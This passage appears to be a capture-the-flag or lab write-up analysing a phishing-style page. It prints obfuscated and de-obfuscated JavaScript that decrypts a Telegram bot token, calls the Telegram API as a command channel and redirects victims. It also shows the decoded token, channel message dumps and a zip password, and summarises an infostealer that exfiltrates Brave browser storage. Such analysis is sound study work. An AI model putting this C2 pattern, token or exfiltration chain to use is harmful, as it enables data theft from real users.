0E5\u00BF\u00BC\u00B5\u005A\u00E6\u00D7\u0014\u00E3\u007F\u0024\u005C\u00EE\u008A\u006B\u008C\u00F1\u004C\u0044\u0091\u004E\u00E5\u000D\u00E7\u0090\u0081\u006B\u00E7\u00B6\u008A\u00CB\u00BB\u000B\u006B\u0051\u0036\u00F1\u0095\u0031\u0049\u00EE\u00A6\u008D\u004D\u0070\u00D1\u0031\u003E\u00A8\u005F\u0099\u0084\u0091\u00C4\u0035\u00FE\u0090\u00CF\u0086\u00C2\u001E\u00E0\u0093\u0069\u0031\u0040\u00B8\u0005\u00CE\u00F2\u00C7\u00CF\u0017\u0053\u00A7\u00B5\u0090\u0098\u0065\u005C\u00D8\u00FF\u0041\u00B3\u00FB\u0017\u004B\u00F2\u003A\u00B5\u00C8\u0067\u00AE\u0064\u0092\u0061\u00FC\u005F\u00E3\u0040\u00B8\u00FC\u000C\u00AB\u0058\u0091\u0049\u0069\u0089\u00A7\u0015\u0038\u0048\u0076\u00D8\u007B\u0067\u006C\u00AA\u0095\u00F6\u00E0\u0068\u000D\u0072\u00F9\u00E4\u0092\u0071\u0075\u00EE\u00F0\u00AF\u0069\u009D\u0061\u00BF\u009C\u00DE\u00A7\u00DD\u00BB\u00CB\u006F\u003C\u006B\u0083\u00EF\u00FA\u005A\u00FC\u00FF\u0093\u0097\u00EB\u0053\u0026\u00F7\u00A7\u001B\u000B\u004A\u00D7\u00AA\u00D8\u00B2\u003D\u00DC\u0086\u003C\u00BB\u005A\u00D5\u00B0\u00CB\u0061\u00F1\u0012\u00B5\u003F\u00A3\u0038\u00EC\u00DE\u0049\u00F2\u00F7\u00B6\u00BC\u005E\u00DA\u0008\u002E\u0053\u0060\u00E8\u005B\u00C7\u00F4\u0013\u00BA\u004E\u0066\u0033\u0051\u0088\u00D1\u00C1\u0022\u000E\u00AB\u0084\u00BB\u002E\u0097\u00EB\u002D\u0075\u0008\u0025\u0037\u0078\u005E\u00F2\u0087\u0048\u0067\u00B9\u0088\u0031\u009C\u000D\u008A\u005D\u0051\u0081\u00C8\u00D5\u007D\u00A2\u00FB\u00BC\u00DC\u0008\u0042\u002D\u00FE\u00EA\u008F\u002F\u00F1\u002F\u0081\u001D\u0069\u0010\u0021\u00C3\u0081\u0054\u0040\u0085\u006B\u00D1\u0028\u0029\u007D\u0081\u0059\u00B6\u006F\u0008\u0044\u00F9\u00F6\u00B2\u0079\u0091\u0077\u00D4\u0040\u00C8\u0085\u0037\u008A\u004C\u0034\u00D4\u009A\u002F\u00F0\u0058\u00F6\u0014\u000E\u00FA\u00B6\u0094\u0089\u00BA\u00E5\u00E3\u0058\u0072\u00E5\u0033\u0087\u003F\u00E3\u001E\u0030\u0021\u00FB\u0034\u00C8\u00E0\u0044\u007E\u003A\u00CF\u00C8\u002D\u00BE\u00A4\u009B\u0060\u004C\u0077\u00CE\u001D\u0053\u001E\u00CE\u00D5\u00E4\u0032\u00B4\u0032\u004A\u009F\u00D1\u00E4\u0068\u000F\u00C9\u007B\u0098\u00F4\u0074\u002E\u0001\u00F4\u0082\u0097\u00D6\u000F\u0082\u0006\u0049\u0016\u00BF\u0077\u0057\u00B7\u0088\u0019\u0087\u00E4\u0092\u0036\u0036\u0076\u0075\u002F\u0028\u0093\u008E\u0089\u004B\u0068\u008F\u0091\u0097\u00BC\u005F\u003C\u00EA\u008D\u0094\u00D0\u00CC\u0050\u00D8\u00C1\u009A\u0074\u009F\u0064\u00CB\u0014\u0089\u0019\u0044\u00EB\u004E\u004A\u00CF\u009A\u0007\u00FA\u0087\u0009\u006E\u00CB\u00CF\u00FD\u0025\u0099\u00B7\u00A3\u000C\u0054\u0029\u007F\u00CA\u007F\u00BD\u0080\u005C\u0071\u0067\u009D\u0040\u002E\u008B\u005D\u0074\u006E\u0091\u0092\u0035\u0093\u00F4\u000A\u00E0\u0031\u00D2\u0039\u00EE\u00BD\u00D7\u0063\u00F6\u0096\u0062\u00F7\u005F\u0086\u0051\u0052\u00DE\u0021\u002E\u0095\u00F0\u0058\u0056\u0080\u004C\u00D9\u0062\u0088\u009B\u0095\u0046\u00F7\u00D8\u00B7\u0076\u0083\u00C0\u00ED\u0014\u005D\u0041\u00CB\u00BE\u0011\u00D6\u0014\u00CF\u0030\u008F\u006F\u0032\u00A6\u002D\u0017\u0075\u00AA\u0011\u003C\u0009\u00F2\u00C7\u00BB\u00CF\u00C9\u00C3\u0052\u00CD\u003F\u0067\u0011\u0002\u00F2\u0002\u006B\u00B5\u000E\u00DE\u0048\u003A\u008E\u000C\u00A2\u00E4\u00BD\u00BF\u0095\u00D9\u007B\u00CF\u007E\u003F\u0082\u00B0\u0041\u00AC\u00AC\u0091\u004B\u005A\u0038\u0039\u001D\u00D4\u00CA\u00E9\u0080\u00CD\u00DA\u00E5\u0018\u00D1\u0047\u00FA\u007E\u00E4\u00EA\u00D9\u0084\u0043\u0099\u00BF\u00A7\u00D8\u00B7\u0005\u004E\u00DF\u0054\u0060\u0080\u00E5\u0048\u0044\u00E5\u00D2\u0057\u0093\u00C7\u00F7\u0020\u0020\u0027\u0052\u000F\u00CD\u009C\u00D2\u006A\u00E2\u0007\u00E9\u0005\u00A0\u00D1\u00AC\u00F7\u00C8\u0001\u00E9\u00C8\u0046\u0099\u0086\u0065\u00B4\u001B\u007E\u007E\u007C\u00F1\u00B9\u00E9\u0063\u00AE\u0044\u00FD\u0070\u00C5\u00D8\u001A\u00D8\u0099\u00A5\u0043\u00D4\u00A9\u001E\u001D\u0060\u000F\u0023\u0020\u00D6\u00FD\u000D\u00BF\u00EE\u0066\u001E\u008B\u0095\u009F\u0072\u00E1\u00A1\u0006\u0097\u00DF\u007C\u00FA\u0086\u00E2\u00D9\u0014\u0097\u00F1\u00D0\u003C\u008F\u0026\u004F\u003A\u00E4\u00CD\u0000\u00EC\u000B\u006E\u000E\u0021\u00F3\u00F1\u0058\u002A\u0028\u00CB\u006B\u00B6\u0001\u000F\u0012\u0078\u00F4\u0092\u008F\u00B8\u0098\u0096\u00E8\u00A8\u0015\u000F\u004F\u007C\u0084\u001D\u0062\u00EF\u00B4\u00CD\u00A6\u0049\u0039\u00CF\u003B\u00BB\u0071\u0050\u00C2\u00CE\u008A\u0058\u00FA\u0034\u00C0\u001F\u005F\u007A\u00E6\u006C\u007A\u00C2\u0057\u0043\u00A6\u0016\u0053\u0026\u0060\u00A6\u0053\u009E\u00E2\u00E9\u0047\u0048\u0089\u0095\u00F2\u00BE\u007E\u006C\u004C\u00E6\u0003\u0024\u00AC\u00EA\u004E\u00B2\u0037\u0049\u002C\u00B1\u00B9\u00C1\u0085\u00C9\u00EA\u00D5\u0057\u003A\u000F\u0012\u00A6\u0018\u0033\u00C9\u0069\u00DC\u000A\u0001\u002B\u008E\u001C\u00EB\u0031\u0033\u00F8\u006D\u0059\u00C0\u0075\u00E9\u0056\u009F\u0073\u0093\u0018\u00B4\u00E7\u0078\u00C3\u001A\u0072\u0030\u003F\u0068\u0066\u00F6\u002B\u001A\u0094\u0004\u0044\u0067\u00A5\u009C\u0038\u0099\u00DA\u0010\u0008\u00C6\u0017\u00E3\u0061\u00D1\u005D\u00B5\u00E2\u009D\u00C6\u0087\u00FB\u003D\u00A9\u0028\u0018\u000D\u007D\u00FA\u006C\u00D2\u00B9\u008D\u000E\u007E\u0092\u0095\u0072\u003E\u00B5\u007B\u00AE\u0097\u0005\u00E5\u005D\u0090\u0003\u0091\u009C\u0053\u00E1\u008B\u00E5\u00A5\u00F6\u00E9\u00F3\u0077\u00C9\u00AC\u0010\u0064\u00F2\u00EF\u00B4\u0060\u0080\u007E\u00CF\u00FB\u00A4\u0038\u0025\u0032\u00A5\u00CE\u0046\u00DD\u0087\u0054\u0077\u0036\u006A\u0049\u0024\u00BC\u0012\u004D\u0027\u0039\u0062\u0034\u00D7\u006D\u007F\u00C5\u0026\u0072\u0068\u00EE\u00DD\u00FA\u0092\u001C\u006E\u00CE\u005D\u00F8\u00F5\u007B\u00FA\u0022\u00D3\u004D\u0052\u007F\u00AC\u0074\u005F\u002A\u0045\u004C\u0043\u0068\u0066\u002C\u001D\u006A\u003C\u0000\u0077\u008C\u006D\u00FD\u0038\u0012\u001E\u00D1\u0098\u00A7\u0093\u001B\u00B6\u00E8\u00A3\u00F1\u007C\u0099\u00E7\u0077\u0012\u00CA\u0061\u003F\u0017\u0041\u0027\u00E2\u00E6\u008D\u007C\u00E9\u00B0\u006E\u0099\u00D1\u00B9\u00DC\u00CD\u00DE\u001B\u004A\u00F5\u0026\u007C\u002A\u0064\u008C\u008D\u0068\u00FF\u003F\u0073\u003B\u0082\u0098\u0089\u0079\u0098\u00B2\u00A1\u00B8\u0037\u0004\u00F4\u001F\u00EA\u0000\u0015\u003C\u0053\u002A\u0073\u0051\u0073\u00F9\u0018\u00A5\u0034\u0080\u005E\u00BE\u000C\u00E9\u00D4\u00ED\u009A\u0023\u002C\u0036\u004C\u00D5\u00D5\u009E\u0031\u0085\u0001\u00DA\u0043\u002D\u00FC\u00B4\u00B9\u00C9\u006F\u00EA\u0031\u0051\u00F4\u00DF\u0039\u0058\u008C\u0053\u0070\u000F\u0040\u00FA\u00E2\u0084\u00DB\u0016\u00A4\u000D\u006A\u0074\u0068\u0068\u009B\u0056\u002D\u00CC\u002B\u0054\u0026\u00F8\u00DB\u00AC\u00AF\u00A7\u00FB\u0001\u00A8\u00CF\u0036\u00F6\u0095\u0072\u00B4\u00B2\u0054\u005F\u0099\u00BB\u00CC\u006C\u0060\u0087\u007C\u00AA\u001B\u00CA\u0001\u00CB\u0097\u0050\u00B7\u002C\u001C\u0085\u0049\u0012\u0056\u0011\u00CC\u0021\u0096\u00E9\u003E\u0071\u008A\u00B7\u0090\u0087\u00D1\u0043\u00B7\u0028\u00EF\u0091\u0065\u00C7\u008F\u005B\u005E\u0004\u00E8\u0082\u0084\u00E1\u0036\u0024\u00B9\u00DB\u00FA\u0058\u001C\u003C\u005D\u0078\u00E4\u006C\u00E9\u00F5\u0013\u0020\u00E7\u0009\u00E0\u0016\u0062\u0024\u0042\u00CD\u005B\u001E\u00B7\u0020\u003D\u00C3\u000B\u00DD\u005A\u0040\u0031\u0089\u00C5\u0022\u00F6\u003E\u0054\u0052\u00C1\u0099\u0043\u00BF\u00C2\u00A4\u0038\u00CA\u00C4\u00B9\u0069\u0044\u00DE\u0016\u0085\u00A9\u00CB\u00F3\u0098\u0043\u00C8\u00C1\u000F\u004F\u006B\u0010\u0025\u0000\u00F3\u00C1\u00EC\u008E\u007A\u00CB\u00D3\u003F\u00AA\u00F7\u00C4\u007E\u00E8\u00BA\u0009\u005B\u001A\u0078\u005E\u0017\u0001\u00C3\u00B1\u00A2\u006B\u002B\u0043\u0014\u009F\u0016\u0013\u00D0\u0032\u007F\u00F8\u00FC\u006D\u00A1\u0026\u00F9\u0093\u006D\u0027\u00F8\u00C2\u008B\u00E3\u00CA\u0001\u003B\u0017\u0084\u005C\u0036\u0092\u00A9\u0088\u00D3\u0042\u0027\u00D8\u001F\u008F\u0021\u0013\u00D0\u0008\u0020\u00D4\u000D\u0088\u00F8\u0045\u00F1\u0089\u0088\u0013\u0017\u005B\u00C7\u0031\u004F\u0023\u00DB\u002F\u0055\u0032\u009E\u0098\u0052\u00C6\u004D\u00B6\u00D8\u007A\u0032\u00F4\u002D\u00A7\u00E8\u0086\u0066\u003C\u00EC\u004C\u0076\u00F7\u0020\u00E0\u004C\u0088\u0054\u000B\u0030\u00F8\u00FB\u00CA\u0050\u003B\u0099\u008D\u005B\u00D0\u0036\u005F\u002C\u003F\u00BC\u0068\u007B\u0045\u00B9\u00A3\u00E4\u0081\u00D7\u00B9\u00CB\u00EB\u004B\u00F2\u0085\u00EA\u0027\u0065\u000D\u006D\u0074\u00F5\u007B\u00C5\u009E\u001F\u001C\u00CD\u0010\u000B\u0079\u00C5\u0027\u00D4\u002A\u00D8\u001F\u0057\u0001\u0017\u005A\u004A\u005A\u0043\u00B4\u00A6\u0059\u00E0\u00FB\u008A\u0009\u00BC\u00E4\u005F\u0047\u0092\u00B7\u00AD\u002C\u0052\u0073\u000B\u008D\u003B\u0071\u00B2\u00C0\u00D2\u0029\u0031\u0028\u00D7\u0009\u0075\u00F8\u00CF\u00ED\u009B\u007A\u0063\u00D8\u005C\u00B9\u00AA\u00A3\u0018\u0055\u00D6\u0070\u00E3\u002B\u0089\u004E\u00B6\u001E\u00FC\u001B\u00D7\u0056\u003B\u007F\u00F2\u00B8\u00BB\u00FF\u0088\u00B6\u0006\u0009\u0008\u009C\u0069\u0020\u006A\u00C7\u0093\u0091\u007C\u006B\u006A\u00C9\u00A4\u009D\u0080\u006B\u006D\u0031\u0010\u007D\u004E\u0062\u0047\u000E\u00C7\u0082\u00D0\u00A1\u0098\u009B\u0047\u0077\u0042\u00C7\u005A\u003F\u00F9\u005F\u0070\u00AF\u00EE\u0086\u0096\u00B8\u00A9\u0026\u008B\u00BC\u0008\u002B\u0014\u00C4\u0084\u000F\u0052\u0026\u000B\u0027\u0084\u006B\u004A\u00F9\u0040\u0002\u00C7\u0022\u0065\u003A\u0079\u0049\u0005\u0083\u00EA\u0001\u0043\u00E4\u001F\u00C0\u00AB\u0036\u007E\u0061\u0010\u002E\u0005\u002D\u00F7\u008B\u0046\u00D0\u009F\u0010\u00A2\u0067\u00BB\u0094\u00CD\u000E\u00A1\u0049\u00E2\u0082\u0043\u009F\u00A9\u00BA\u0051\u00FF\u0060\u00F4\u0063\u006C\u00E4\u0007\u009B\u00A2\u0069\u00DB\u00AA\u00F0\u008B\u0080\u00D5\u00CE\u008F\u006A\u0076\u0082\u0030\u0034\u00B1\u009E\u009E\u00D2\u009F\u00AD\u008C\u00B1\u00EB\u0063\u00DC\u00F2\u0047\u0028\u00AC\u00F4\u00EF\u0054\u003B\u0066\u00B1\u0005\u00FF\u008C\u007B\u001A\u0011\u002F\u001A\u0074\u0048\u0024\u0046\u0047\u008A\u0032\u00E6\u00F4\u0042\u00A8\u0099\u00EF\u0016\u0040\u00D2\u00F2\u0093\u00E8\u0066\u00F3\u000E\u0058\u00E1\u00A5\u00D8\u00B5\u00EC\u00F5\u0040\u009F\u0016\u0017\u00EC\u0065\u0019\u000D\u001D\u00E6\u00D7\u006E\u006B\u0009\u007C\u003F\u0007\u00D3\u00C8\u00F9\u0017\u009E\u00E7\u0074\u005E\u00AA\u0083\u00EA\u00A9\u0005\u00E9\u0033\u000E\u00DB\u00D8\u0081\u0097\u0089\u0060\u00B0\u00A3\u00DA\u0068\u009F\u001B\u00CC\u0054\u003B\u0035\u009F\u00F4\u008D\u0062\u00FB\u00F5\u006D\u0090\u00C5\u00E0\u009D\u00CD\u0080\u0030\u00DF\u0042\u0073\u00AE\u0033\u00A5\u0015\u009F\u00D9\u0008\u0056\u00B0\u0096\u00C4\u002F\u0040\u002A\u00B6\u00B0\u0053\u00B7\u00AB\u0021\u003F\u0054\u00C7\u006A\u00A5\u00BC\u0068\u009D\u00CC\u00B0\u00A3\u0004\u0019\u004B\u0027\u006C\u00A1\u0035\u0028\u00D1\u0057\u006A\u0066\u0054\u0047\u00E0\u007C\u0039\u0013\u0079\u0056\u006B\u00CE\u001E\u00CB\u0006\u0082\u00AB\u000C\u00EC\u0099\u00A3\u00A0\u00B9\u00BD\u00A9\u009A\u0062\u00F1\u000E\u0041\u00DC\u00CF\u0069\u0076\u00B0\u006D\u00BA\u00F6\u00D1\u0049\u00F9\u001F\u004D\u0031\u0095\u00C5\u00BC\u0013\u0071\u00D0\u00D5\u0063\u00B4\u0027\u00A6\u0019\u0051\u0002\u004B\u00E2\u0086\u0026\u00EF\u003A\u00B6\u005B\u00B5\u0032\u00A8\u0049\u00D6\u00F3\u001E\u002C\u0035\u001E\u0000\u007A\u007C\u006B\u0075\u0036\u00F9\u000F\u00AB\u00A3\u00B2\u00BD\u004E\u00F1\u0049\u0011\u00DC\u00D0\u00AC\u0074\u00B9\u0009\u00EF\u0029\u00B4\u0075\u0002\u00DD\u0058\u0018\u008C\u0000\u0006\u00BE\u005D\u0041\u008F\u0073\u004C\u00EC\u0029\u000D\u00D1\u009F\u003D\u00CC\u00F3\u0001\u0039\u0038\u00D8\u00A5\u0054\u0044\u005D\u0072\u0098\u005F\u00CD\u0092\u00A1\u00A3\u00AF\u00D3\u0086\u00F0\u00BC\u006B\u00E5\u00F1\u0008\u00CE\u0053\u00B5\u00D2\u0055\u00C6\u0019\u0052\u0040\u003E\u005E\u008A\u00EC\u009C\u0012\u002C\u00D5\u00EA\u000B\u00C6\u0057\u0040\u0060\u008B\u00E8\u000F\u001A\u00A0\u008C\u0021\u00BC\u002A\u003B\u0028\u00A2\u0077\u00A3\u00EB\u00E6\u0035\u0068\u0024\u0098\u00AA\u00FD\u007F\u0096\u004B\u00EB\u0054\u0049\u0060\u00B2\u0055\u00BF\u001F\u006C\u0013\u006B\u00AA\u0010\u00BF\u00EC\u00B2\u00B9\u00A9\u0029\u0086\u0068\u008F\u0037\u0046\u0017\u0001\u000E\u000C\u0062\u0010\u00C5\u00F4\u0089\u00FD\u0045\u009F\u0026\u005C\u003F\u005C\u0027\u00F3\u00BF\u009C\u00C9\u0066\u007E\u005B\u0043\u0016\u00DA\u000F\u0097\u0070\u0065\u000F")))},CryptoJS[_$_9b39[4]][_$_9b39[3]][_$_9b39[2]](btoa(unescape("\u00DB\u00ED\u0098\u006C\u00B1\u0089\u00A1\u0047\u0095\u00F2\u008A\u00B3\u0017\u00AF\u004C\u002D\u00B2\u0007\u0037\u0029\u00CF\u0054\u00BC\u0093"))),{iv:CryptoJS[_$_9b39[4]][_$_9b39[3]][_$_9b39[2]](btoa(unescape("\u00E4\u0075\u0026\u0014\u00CA\u004A\u0037\u002F\u0038\u0009\u00FC\u00C6\u000D\u0009\u0030\u008A")))}).toString(CryptoJS[_$_9b39[4]][_$_9b39[5]]));
```

##### De-obfuscated malicous JavaScript
```javascript
document.getElementById('newsletterForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const emailField = document.getElementById('email');
    const chatIdField = document.getElementById('descriptionField');
    let isValid = true;

    // Validate email field
    if (!emailField.value) {
        emailField.classList.add('shake');
        isValid = false;
        setTimeout(() => emailField.classList.remove('shake'), 500);
    }

    if (!isValid) return;

    const emailPart = emailField.value.split('@')[0];
    const chatId = parseInt(chatIdField.value, 10);
    handleFormSubmission(emailPart, chatId);
});

function generateSecurityToken(seed) {
    return function() {
        var args = Array.prototype.slice.call(arguments),
            offset = args.shift();
        return args.reverse().map((num, idx) => 
            String.fromCharCode(num - offset - 7 - idx)
        ).join('');
    }(43, 106, 167, 103, 163, 98) + 
    1354343..toString(36).toLowerCase() + 
    21..toString(36).toLowerCase().split('').map(c => 
        String.fromCharCode(c.charCodeAt() - 13)
    ).join('') + 
    4..toString(36).toLowerCase() + 
    32..toString(36).toLowerCase().split('').map(c => 
        String.fromCharCode(c.charCodeAt() - 39)
    ).join('') + 
    381..toString(36).toLowerCase().split('').map(c => 
        String.fromCharCode(c.charCodeAt() - 13)
    ).join('') + 
    function() {
        var args = Array.prototype.slice.call(arguments),
            offset = args.shift();
        return args.reverse().map((num, idx) => 
            String.fromCharCode(num - offset - 60 - idx)
        ).join('');
    }(42, 216, 153, 153, 213, 187);
}

function handleFormSubmission(emailPart, chatId) {
    const CHANNEL_ID = -1002496072246;
    const ENCRYPTED_TOKEN = "nZiIjaXAVuzO4aBCf5eQ5ifQI7rUBI3qy/5t0Djf0pG+tCL3Y2bKBCFIf3TZ0Q==";
    
    if (emailPart === generateSecurityToken('s3cur3k3y') && 
        CryptoJS.SHA256(sequence.join()).toString(CryptoJS.enc.Base64) === 
        "18m0oThLAr5NfLP4hTycCGf0BIu0dG+P/1xvnW6O29g=") {
        
        const decryptedToken = CryptoJS.RC4Drop.decrypt(
            ENCRYPTED_TOKEN, 
            CryptoJS.enc.Utf8.parse(emailPart), 
            { drop: 192 }
        ).toString(CryptoJS.enc.Utf8);

        const API_URL = "https://api.telegram.org/bot" + decryptedToken; // https://api.telegram.org/bot7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc
        const xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (xhr.readyState === XMLHttpRequest.DONE) {
                try {
                    const response = JSON.parse(xhr.responseText);
                    window.location.replace(response.result.text);
                } catch (error) {
                    alert('Form submitted!');
                }
            }
        };
        xhr.open('GET', `${API_URL}/forwardMessage?chat_id=${chatId}&from_chat_id=${CHANNEL_ID}&message_id=5`);
        xhr.send();
    } else {
        alert('Form submitted!');
    }
}

// Sequence tracking for checkbox interactions
const sequence = [];
function trackCheckboxInteraction() {
    sequence.push(this.id);
}

// Attach event listeners to checkboxes
document.querySelectorAll('input.cb').forEach(checkbox => {
    checkbox.addEventListener('change', trackCheckboxInteraction);
});
```

#### Key Functionality Breakdown
1. **Form Submission Handling**
   - Intercepts form submission
   - Validates email format
   - Extracts username portion from email
   - Parses chat ID from description field

2. **Security Token Generation**
   - Generates token `0p3r4t10n_4PT_Un10n` through:
     - Character code manipulation
     - Base36 conversions
     - Arithmetic operations

3. **Telegram API Interaction**
   - Required credentials:
     ```javascript
     CHANNEL_ID = -1002496072246
     ENCRYPTED_TOKEN = "nZiIjaXAVuzO4aBCf5eQ5ifQI7rUBI3qy/5t0Djf0pG+tCL3Y2bKBCFIf3TZ0Q=="
     ```
   - Forwards message ID 5 to specified chat ID

4. **Checkbox Sequence Validation**
   - Tracks checkbox interaction order
   - Validates SHA-256 hash of sequence against:
     `18m0oThLAr5NfLP4hTycCGf0BIu0dG+P/1xvnW6O29g=`
   - Correct sequence: `C4, C2, C2, C2, C1, C3, C4, C1`

#### Successful Form Submission
![](https://i.imgur.com/wJYSeOR.png)

#### Telegram Channel Analysis
Using [matkap](https://github.com/0x6rss/matkap) to extract messages:
```
=== Captured Messages ===

--- Message ID: 5 ---
Date: 1742658155
Text: https://t.me/+_eYUKZwn-p45OGNk
----------------------------------------

--- Message ID: 6 ---
Date: 1742658155
File ID: BQACAgQAAyEFAASUxwo2AAMGZ93ttKcc24vGEJPqqIstCeH-0rgAAs4YAALNMcBT0DBTt6JgX1k2BA
----------------------------------------

--- Message ID: 9 ---
Date: 1742658157
Text: Oh, yes! It is dr4g0nsh34rtb3l0ngst0m4l4k4r
----------------------------------------
```

#### Malware Analysis (Brave.zip)
- Password: `dr4g0nsh34rtb3l0ngst0m4l4k4r`
- Behavior:
  - Only executes on Brave Browser
  - Exfiltrates local storage data
  - Network artifacts show JWT usage

#### Network Capture (FakeNet)
![](https://i.imgur.com/9b4qX6c.png)

#### JWT Analysis
Decoded content:
![](https://i.imgur.com/jJ4K2Rc.png)

Final flag after Base64 decoding:
![](https://i.imgur.com/1jv5IPC.png)

###### Complete Attack Chain
1. Victim submits form with specific credentials
2. Script decrypts Telegram bot token
3. Forwards message containing channel invite
4. Malware exfiltrates Brave browser data
5. C2 communication via JWT-authenticated API

---